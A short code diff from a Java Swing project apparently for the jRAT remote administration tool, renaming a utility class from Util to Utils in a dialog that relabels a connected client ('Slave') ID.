@@ -16,7 +16,7 @@ import javax.swing.border.EmptyBorder;
 
 import pro.jrat.Slave;
 import pro.jrat.settings.ServerID;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -57,7 +57,7 @@ public class FrameRename extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				ServerID.getGlobal().add(txtNewID.getText(), sl.getServerID(), sl.getRawIP());
 				for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
-					Slave sla = Util.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
+					Slave sla = Utils.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
 					if (sla != null) {
 						Frame.mainModel.setValueAt(txtNewID.getText(), i, 1);
 						break;
